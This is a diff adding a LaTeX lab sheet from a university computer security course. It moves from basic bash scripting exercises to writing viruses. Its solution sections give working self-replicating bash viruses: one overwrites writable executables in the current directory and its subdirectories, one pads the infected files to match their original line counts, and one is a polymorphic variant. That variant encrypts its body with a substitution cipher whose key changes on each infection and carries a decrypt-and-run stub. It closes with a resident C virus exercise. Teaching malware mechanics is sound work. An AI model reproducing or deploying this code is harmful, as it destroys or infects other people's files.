@@ -1,0 +1,539 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage{comment}
+\usepackage{fullpage}
+\usepackage[all]{xy}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+%\usepackage{algorithm}
+\usepackage{graphicx}
+%\usepackage[compatible,noend]{algpseudocode}
+\usepackage{latexsym}
+\usepackage{float}
+\usepackage{color}
+
+%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+
+%% Les ensembles de modelisation
+\newcommand{\Ki}{\mathcal{K}}
+\newcommand{\Ci}{\mathcal{C}}
+\newcommand{\Mi}{\mathcal{M}}
+\newcommand{\Ei}{\mathcal{E}}
+\newcommand{\Di}{\mathcal{D}}
+
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+
+%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemma}
+\newtheorem{algorithme}{ Algorithm }
+\newtheorem{corolaire}{Corollary}
+\newtheorem{propriete}{Property}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme} {Theorem}
+\newtheorem{definition}{Definition}
+%\newtheorem{correction}{Correction}
+\excludecomment{correction}
+
+\theoremstyle{definition}
+\newtheorem*{probleme}{Problem}
+\newtheorem*{cout}{Cost}
+\newtheorem*{fait}{Fact}
+\newtheorem*{notation}{Notation}
+\newtheorem*{complexite}{Complexity}
+\newtheorem{exercice}{Exercise}
+%\theoremstyle{remark}
+\newtheorem{remarque}{Remark}
+\newtheorem{exemple}{Example}
+
+%%%%%%%%%%%%%%%%%% ANNEE COURANTE
+%newcounter{fooyear} 
+%setcounter{fooyear}{2026} 
+%addtocounter{fooyear}{1}
+%arabic{fooyear}
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{University of Perpignan} \hfill  L3 Computer Science \\
+ \hfill C. Legrand \hfill  Year 2026  \\
+\smallskip
+\begin{center}
+{
+ {\scshape \large Lab Work 3 -- Computer Security}  \\
+ Interpreted Viruses
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+%\hline
+
+\bigskip
+
+\bigskip
+
+\section{Some BASH Scripts}
+  
+\begin{exercice}
+
+ You will write your first script. Don't forget to give the file execution permission before running it.  
+\begin{enumerate}
+\item Write a script that displays the following information
+\begin{itemize}
+\itemb A sentence containing the user's name and the type of shell being used;
+\itemb The date (use the \verb|date| command).
+\end{itemize}
+\item Modify the previous script so that it also indicates the season based on the current date.
+%\item Modifier le précédent script afin qu'il affiche aussi la fréquence du processeur en GHz (on utilisera les données présente dans le fichier \verb|/proc/cpuinfo|).
+\end{enumerate}
+\end{exercice}
+
+
+\begin{correction}
+The following script answers the exercise questions:
+\begin{verbatim}
+#!/bin/bash
+
+echo "Hello $USER, you are using the shell $SHELL"
+echo "Today is $(date +%D)"
+
+# indicate the season (for simplicity, only the month is considered
+mois=$(date +%m)
+
+if [ $mois -le 3 ]
+then 
+echo "It is winter"
+elif [ $mois -gt 3 -a  $mois -le 6 ]
+then
+echo "It is spring"
+elif [ $mois -gt 6 -a  $mois -le 9 ]
+then
+echo "It is summer"
+elif [ $mois -gt 9 -a  $mois -le 12 ]
+then
+echo "It is autumn"
+fi
+echo "The processor frequency is:"
+cat /proc/cpuinfo | grep GHz | head -n 1 | cut -d "@" -f2
+
+\end{verbatim}
+\end{correction}
+
+
+\begin{exercice}
+Recall that the syntax for the while loop in bash is as follows:
+\begin{verbatim}
+  while test
+  do
+    command(s)
+  done
+\end{verbatim}
+\begin{enumerate}
+\item
+Write a script called \texttt{countdown} that prints to standard output something like
+%    Write a script called countdown that prints output similar to the following:
+\begin{verbatim}
+    10
+    9
+    8
+    7
+    6
+    5
+    4
+    3
+    2
+    1
+    GO!
+\end{verbatim}
+\item Modify the \texttt{countdown} script so that it takes as parameter the number from which to start the countdown.
+\end{enumerate}
+\end{exercice}
+
+\begin{correction}
+The script answering question 1 is as follows
+\begin{verbatim}
+#!/bin/bash
+compteur=10
+while [ $compteur -gt 0 ]
+do
+ echo $compteur
+ compteur=$(($compteur-1))
+done
+\end{verbatim}
+for question 2, simply change the assignment \texttt{compteur=10} to \texttt{compteur=\$1}
+\end{correction}
+
+\begin{exercice}
+\begin{enumerate}
+\item Write a bash script that iterates through the contents of a directory and counts the number of regular files and directories, displaying both numbers at the end.
+\item  (Optional) Write a script that traverses a file tree and outputs to standard output the names of files whose last modification date precedes a date given as parameter.
+%\item \'Ecrivez un script "renomme.sh" permettant de renommer un ensemble de fichier. Par exemple \verb|./renomme.sh '.c' '.bak'| aura pour effet de renommer tous les fichiers d'extension \verb|.c| ou \verb|.bak|, par exemple le fichier \verb|toto.c| devient \verb|toto.bak|.
+\end{enumerate}
+\end{exercice}
+
+\begin{correction}
+\begin{itemize}
+\item Question 1.
+\begin{verbatim}
+#!/bin/bash
+
+nbrep=0
+nbfic=0
+
+for file in * 
+do
+#echo $file
+if [ -f $file ]
+then
+    nbfic=$(($nbfic+1))
+fi
+if [ -d $file ]
+then
+    nbrep=$(($nbrep+1))
+fi
+done 
+
+echo "number of regular files= $nbfic"
+echo "number of directories= $nbrep"
+\end{verbatim}
+
+\item Question 2. A practical solution here is to use a recursive function. For simplicity, we compare the creation date with only the year given as parameter.
+
+\begin{verbatim}
+#!/bin/bash 
+
+anneelim=$1
+export anneelim
+
+function rec {
+    #echo $1 
+    for i in *
+    do
+	if [ -d "$i" ]
+	then
+	    cd $i	    
+	    rec $i
+	elif [ -f "$i" ]
+	then
+             # we retrieve the year of
+	    DT=$(ls --full-time $i | cut -d " " -f6) 
+
+	    annee=$(echo $DT | cut -d "-" -f1)
+	    #echo "$DT et $annee"
+            # we compare with the year given as script parameter
+	    if [ $annee -gt  $anneelim ]
+	    then
+		echo "$i was created on $DT and is located in $(pwd)"
+	    fi
+	fi
+    done
+}  
+
+rec ./
+
+\end{verbatim}
+\end{itemize}
+\end{correction}
+
+
+\section{Bash Virus Programming}
+
+{\Large Method:} During your development and testing, proceed as follows:
+\begin{itemize}
+\item Edit your virus along with a target script (that simply echoes ``target'') in a working directory.
+\item To test, copy the virus and the target script into a subdirectory, execute it, and analyze what happened.
+\end{itemize}
+For added safety (which we won't do in lab since the viruses created here only spread within the test directory), using a virtual machine is recommended.
+
+
+\begin{exercice}[Improving the \texttt{UNIX\_OWR} virus]$\;$
+
+\begin{enumerate}
+\item Modify the \texttt{UNIX\_OWR} virus so that its action extends to subdirectories and only targets executable files, other than the currently infecting file. 
+\item How can we counter the uniformity of file sizes after infection?
+%\item Améliorer le Virus \texttt{UNIX\_OWR} afin de supprimer les limitations données en cours.
+\end{enumerate}
+\end{exercice}
+
+
+\begin{correction}
+\begin{enumerate}
+\item The following code answers the question. 
+We only descend one level into subdirectories.
+\begin{verbatim}
+#!/bin/bash
+
+#Overwriter I
+for file in *; do #for every file
+    if [ -d $file ]; then # if we encounter a directory
+       cd $file #we move into this directory
+       for file1 in *; do #for every file du repertoire
+	   if [ -x $file1 -a -w $file1 ]; then
+               cp "../$0" $file1 #overwrite target file with virus
+	   fi
+       done
+       cd ..
+    fi
+    echo $file
+    name1=$(basename $0)
+    name2=$(basename "./$file")
+    echo "$name1 != $name2 ??"
+    if [ "$name1" != "$name2" ]
+    then
+	echo "oui pour $name2"
+	if [  -x $file -a -w $file ]; then
+	    echo "cp $0 $file"
+            cp $0 $file #overwrite target file with virus
+	fi
+    fi
+done
+\end{verbatim}
+
+If we wanted to infect the entire file tree of the directory (subdirectories, sub-subdirectories, etc.), we would need to use a recursive function, with copying done from the absolute path containing the infecting file.
+
+
+\item  The technique used here is to add the line \texttt{echo \"adding padding lines\"} to maintain the same number of lines as in the original file.
+
+
+\begin{verbatim}
+#!/bin/bash
+
+#Overwritter I
+for file in *; do #for every file
+    if [ -d $file ]; then # if we encounter a directory
+       cd $file #we move into this directory
+       for file1 in *; do #for every file du repertoire
+	   if [ -x $file1 -a -w $file1 ]; then
+               nbligne=$(wc -l $file | cut -d" " -f 1  ) 
+               cp "../$0" $file1 #overwrite target file with virus
+               count=0
+	       while [ $count -le $(($nbligne - 37)) ]; do
+	         echo "echo \"on rajoute deslignes\"" >> $file
+	         count=$(($count+1))
+	       done
+	       echo "$count $nbligne $file"
+	   fi
+       done
+       cd ..
+    fi
+    name1=$(basename $0)
+    name2=$(basename "./$file")
+    echo "$name1 != $name2 ??"
+    if [ "$name1" != "$name2" ]
+    then
+	if [ -x $file -a -w $file -a "$0" != "./$file" ]; then
+            nbligne=$(wc -l $file | cut -d" " -f 1  ) 
+            cp $0 $file  #overwrite target file with virus
+            count=0
+	    while [ $count -le $(($nbligne - 37)) ]; do
+		echo "echo \"on rajoute deslignes\"" >> $file
+		count=$(($count+1))
+	    done
+	    echo "$count $nbligne $file"
+	fi
+    fi
+done
+\end{verbatim}
+
+
+\end{enumerate}
+\end{correction}
+
+
+
+
+\begin{exercice}
+
+\begin{enumerate}
+\item Write a script that takes a file as argument and applies a character substitution to all or part of the characters.
+You may use the \texttt{tr} command for this.
+%\item En utilisant le code de la première question, modifiez le virus \texttt{vbashp.sh} afin qu'il chiffre avec une subsitution la partie virale lors de chaque infection. Faites-le en plusieurs étapes: 
+%\begin{enumerate}
+\item Using the code from the first question, create a version of \texttt{vbashp.sh} that adds its previously encrypted code to the target file.
+\item In a file containing the encrypted viral code from question 2: prepend a restoration code that 
+\begin{itemize}
+\item selects the encrypted lines, 
+\item decrypts them and puts them in a temporary file,
+\item Executes the temporary file to launch the infection phase.
+\end{itemize}
+%suivi du code de \texttt{vbashp.sh} chiffré. Le code de restauration restaure la partie chiffrée (\texttt{vbashp.sh}), i.e., la déchiffre, dans un fichier temporaire et exécute ce fichier temporaire.
+%\item Combiner 1) et 2) pour faire une version d'\texttt{vbashp.sh} qui infecte par ajout de code préalablement chiffré.
+%\end{itemize}
+%Par souci de simplification vous pouvez utiliser une substitution fixe (dans l'idéal celle ci doit être variable).
+\item What problem does the resulting virus still suffer from? Propose a strategy to solve this problem.
+\end{enumerate}
+
+\end{exercice}
+
+\begin{correction}
+\begin{enumerate}
+\item 
+We perform substitutions using the tr command: the short script below performs a substitution of the file \texttt{\$1} encoded in \texttt{tab1}
+\begin{verbatim}
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="hijabcdefgmnopqrstuvwxyzkl"
+
+#cat $1 | tr  ["$tab1"] ["$tab0"] > fichier-$$.txt
+cat $1 | tr  ["$tab0"] ["$tab1"] > fichier-$$.txt
+\end{verbatim}
+
+\item  We apply this technique to improve the \texttt{vbashp.sh} virus encrypted by substitution, prepending it with a restoration code.
+\begin{verbatim}
+#!/bin/bash
+
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="hijabcdefgmnopqrstuvwxyzkl"
+
+tail -n 11  $0 | tr  ["$tab1"] ["$tab0"] > fichier-$$.sh
+#cat $1 | tr  ["$tab0"] ["$tab1"] > fichier-$$.txt
+chmod u+x fichier-$$.sh
+#./fichier-$$.sh # uncomment this part to enable replication
+exit 0
+
+#!/ifp/ihue
+
+bjeq "jqab eqvb"
+
+cqt f fp *.ue;
+aq # rqwt vqwu nbu cfjefbtu hxbj n'bzvbpufqp ue
+fc vbuv  "./$f" != "$0"; 
+   vebp # uf jfinb != cfjefbt fpcbjvhpv bp jqwtu 
+   vhfn -p 9 $0  >> $f; # hgqwv jqab aw xftwu 
+cf
+aqpb
+\end{verbatim}
+\item The following code answers the question
+
+\begin{verbatim}
+#!/bin/bash
+
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="haigbcevrfwnyopjmqdstuxzkl"
+
+#Overwritter I
+for file in *; do #for every file
+    if [ -x $file -a "$0" != "./$file" -a "$name" != "./$file" ]; then
+	echo "infecting $file by adding encrypted viral code"
+        #We add the encrypted viral part
+	tail -n 11  $0 | tr  ["$tab1"] ["$tab0"] >> $file
+    fi
+done
+\end{verbatim}
+
+
+\item The code is given below: there is a restoration part that decrypts the viral code into a temporary file, first adding the name of the infecting script along with the encryption/decryption substitution. 
+\begin{verbatim}
+#!/bin/bash
+
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="haigbcevrfwnyopjmqdstuxzkl"
+
+echo "#!/bin/bash " > .temp1.sh
+echo "tab0=\"$tab0\"" >> .temp1.sh
+echo "tab1=\"$tab1\"" >> .temp1.sh
+echo "name=\"$0\"" >> .temp1.sh
+tail -28 $0 | tr  ["$tab0"] ["$tab1"]  >> .temp1.sh
+chmod u+x .temp1.sh
+./.temp1.sh
+exit 0
+
+#Ohgikicuugi I
+jni jczg cl *; sn #onvi unvu jcfacgi
+    cj [ -w $jczg -b "$0" != "./$jczg" -b "$lbqg" != "./$jczg" ]; uagl
+	gfan "cljgfucnl sg $jczg"
+	v=$$
+	v=$(($v % 26))
+	u=$ube1
+	c=0
+	kaczg [ $c -zg $v ]; sn
+	    u=$(gfan $u  |  ui ["$ube1"] ["$ube0"])
+	    c=$(($c+1))
+	snlg
+        #Ol gfibtg bhgf zg fnsg sg igtubvibucnl
+	#gfan "#!/ecl/ebta " > $jczg
+	gfan "ube0=\"$ube0\"" >> $jczg
+	gfan "ube1=\"$u\"" >> $jczg
+	gfan 'gfan "#!/ecl/ebta " > .ugqo1.ta' >> $jczg
+	gfan 'gfan "ube0=\"$ube0\"" >> .ugqo1.ta' >> $jczg
+	gfan 'gfan "ube1=\"$ube1\"" >> .ugqo1.ta' >> $jczg
+	gfan 'gfan "lbqg=\"$0\"" >> .ugqo1.ta' >> $jczg
+	gfan 'ubcz -l 28 $0 | ui  ["$ube0"] ["$ube1"] >> .ugqo1.ta' >> $jczg
+	gfan 'faqns v+w .ugqo1.ta' >> $jczg
+	gfan './.ugqo1.ta' >> $jczg
+	gfan 'gwcu 0' >> $jczg
+        gfan "$u"
+	ubcz -l 28  $0 | ui  ["$u"] ["$ube0"] >> $jczg
+    jc
+snlg
+\end{verbatim}
+
+The same code but in cleartext is given below. It propagates by appending, and changes the encryption key with each infection. 
+\begin{itemize}
+\item The code portion \texttt{u=\$\$ j... i=\$((i+1)) done} is used to randomize the substitution used for encryption.
+\item The code portion consisting of the series of echo statements corresponds to the restoration code.
+\item The addition of encrypted infecting code is done with the command \texttt{tail -n 29  \$0 | tr  [\"\$tab1\"] [\"\$tab0\"] >> \$file}.
+\end{itemize}
+\begin{verbatim}
+#!/bin/bash 
+tab0="abcdefghijklmnopqrstuvwxyz"
+tab1="haigbcevrfwnyopjmqdstuxzkl"
+name="./vbashp-improved-avec-code-chiffre.sh"
+#Overwritter I
+for file in *; do #for every file
+    if [ -x $file -a "$0" != "./$file" -a "$name" != "./$file" ]; then
+	echo "infecting $file"
+	u=$$
+	u=$(($u % 26))
+	t=$tab1
+	i=0
+	while [ $i -le $u ]; do
+	    t=$(echo $t  |  tr ["$tab1"] ["$tab0"])
+	    i=$(($i+1))
+	done
+        #We overwrite with the restoration code
+	#echo "#!/bin/bash " > $file
+	echo "tab0=\"$tab0\"" >> $file
+	echo "tab1=\"$t\"" >> $file
+	echo 'echo "#!/bin/bash " > .temp1.sh' >> $file
+	echo 'echo "tab0=\"$tab0\"" >> .temp1.sh' >> $file
+	echo 'echo "tab1=\"$tab1\"" >> .temp1.sh' >> $file
+	echo 'echo "name=\"$0\"" >> .temp1.sh' >> $file
+	echo 'tail -n 28 $0 | tr  ["$tab0"] ["$tab1"] >> .temp1.sh' >> $file
+	echo 'chmod u+x .temp1.sh' >> $file
+	echo './.temp1.sh' >> $file
+	echo 'exit 0' >> $file
+        echo "$t"
+	tail -n 28  $0 | tr  ["$t"] ["$tab0"] >> $file
+    fi
+done
+\end{verbatim}
+
+\item The problem is managing re-infection; a possible technique is to insert a marker in the encrypted part.
+\end{enumerate}
+\end{correction}
+
+\section{Resident Virus in C}
+
+\begin{exercice} We will implement some features of a resident virus.
+\begin{enumerate}
+\item Write a C program that regularly refreshes its code, effectively changing its PID. You may use the following functions
+\begin{verbatim}
+  pid_t fork();
+  int execlp(const char * application, const char * arg, ... );
+  sleep(int sec);
+\end{verbatim}
+\item (Optional) Based on the code from question 1, implement a resident virus that monitors the files in a directory, and if one of the files is modified, overwrites it with its own code. (Hint: use functions from \texttt{time.h}, \texttt{readdir} to traverse a directory, and \texttt{stat} to retrieve file information).
+%Programer un virus résident utilisant la primitive \texttt{fork()} pour rafraîchir le processus viral à intervalles réguliers. Quel est l'intér de ce mécanisme?
+\end{enumerate}
+\end{exercice}
+
+\end{document}
